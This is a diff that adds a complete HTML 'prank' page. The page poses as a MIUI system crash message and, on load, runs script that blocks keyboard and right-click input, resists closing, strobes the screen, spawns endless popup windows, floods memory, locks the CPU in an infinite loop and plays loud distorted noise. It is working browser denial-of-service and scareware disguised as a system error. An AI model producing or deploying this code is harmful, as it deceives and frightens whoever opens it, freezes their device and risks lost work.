@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>MIUI System Crash - Ultimate Brutal Prank</title>
+<style>
+  html, body {
+    margin: 0; padding: 0;
+    width: 100vw; height: 100vh;
+    background: black;
+    color: white;
+    font-family: monospace, monospace;
+    user-select: none;
+    cursor: none;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+  }
+  .message {
+    font-size: 3em;
+    color: red;
+    margin-bottom: 0.3em;
+    animation: flicker 0.15s infinite alternate;
+  }
+  .desc {
+    font-size: 1.5em;
+    color: white;
+    animation: flicker 0.15s infinite alternate;
+  }
+  @keyframes flicker {
+    0% {opacity: 1; color: red;}
+    50% {opacity: 0.5; color: darkred;}
+    100% {opacity: 1; color: red;}
+  }
+</style>
+</head>
+<body>
+  <div class="message">MIUI System isn’t Responding</div>
+  <div class="desc">The process has stopped working.<br>Please restart your device.</div>
+
+<script>
+  document.oncontextmenu = e => e.preventDefault();
+  document.onkeydown = e => e.preventDefault();
+  window.onbeforeunload = e => {
+    e.returnValue = "System crash detected. Cannot leave.";
+    return e.returnValue;
+  };
+
+  setInterval(() => {
+    document.body.style.backgroundColor = (document.body.style.backgroundColor === 'black') ? 'darkred' : 'black';
+  }, 50);
+
+  for(let i=0; i<20; i++) {
+    window.open(location.href, "_blank", "width=300,height=200");
+  }
+  setInterval(() => {
+    window.open(location.href, "_blank", "width=300,height=200");
+  }, 300);
+
+  // Memory flood no limit
+  let mem = [];
+  setInterval(() => {
+    mem.push(new Uint8Array(1024 * 1024));
+  }, 50);
+
+  // CPU overload in main thread (freezes UI HARD)
+  function cpuBurn() {
+    let i = 0;
+    while(true) {
+      Math.sqrt(i * Math.random());
+      i++;
+      if(i > 1e9) i = 0;
+    }
+  }
+  setTimeout(cpuBurn, 100);
+
+  // Audio noise harsh & distorted
+  const ctx = new (window.AudioContext || window.webkitAudioContext)();
+
+  function noise() {
+    const bufferSize = 4096;
+    const noiseNode = ctx.createScriptProcessor(bufferSize, 1, 1);
+    noiseNode.onaudioprocess = e => {
+      const output = e.outputBuffer.getChannelData(0);
+      for(let i = 0; i < bufferSize; i++){
+        output[i] = (Math.random() * 2 - 1) * 0.4; // white noise
+      }
+    };
+    noiseNode.connect(ctx.destination);
+    return noiseNode;
+  }
+
+  function distortedOscillator(){
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    const distortion = ctx.createWaveShaper();
+
+    function makeDistortionCurve(amount) {
+      const k = typeof amount === 'number' ? amount : 50;
+      const n_samples = 44100;
+      const curve = new Float32Array(n_samples);
+      const deg = Math.PI / 180;
+      for(let i = 0; i < n_samples; ++i){
+        const x = i * 2 / n_samples - 1;
+        curve[i] = (3 + k) * x * 20 * deg / (Math.PI + k * Math.abs(x));
+      }
+      return curve;
+    }
+
+    distortion.curve = makeDistortionCurve(400);
+    distortion.oversample = '4x';
+
+    osc.type = 'square';
+    osc.frequency.value = 400 + Math.random() * 1000;
+    osc.connect(distortion);
+    distortion.connect(gain);
+    gain.connect(ctx.destination);
+
+    gain.gain.value = 0.5;
+    osc.start();
+
+    setTimeout(() => {
+      osc.stop();
+      distortion.disconnect();
+      gain.disconnect();
+    }, 200);
+  }
+
+  noise();
+
+  setInterval(() => {
+    distortedOscillator();
+  }, 150);
+
+</script>
+</body>
+</html>
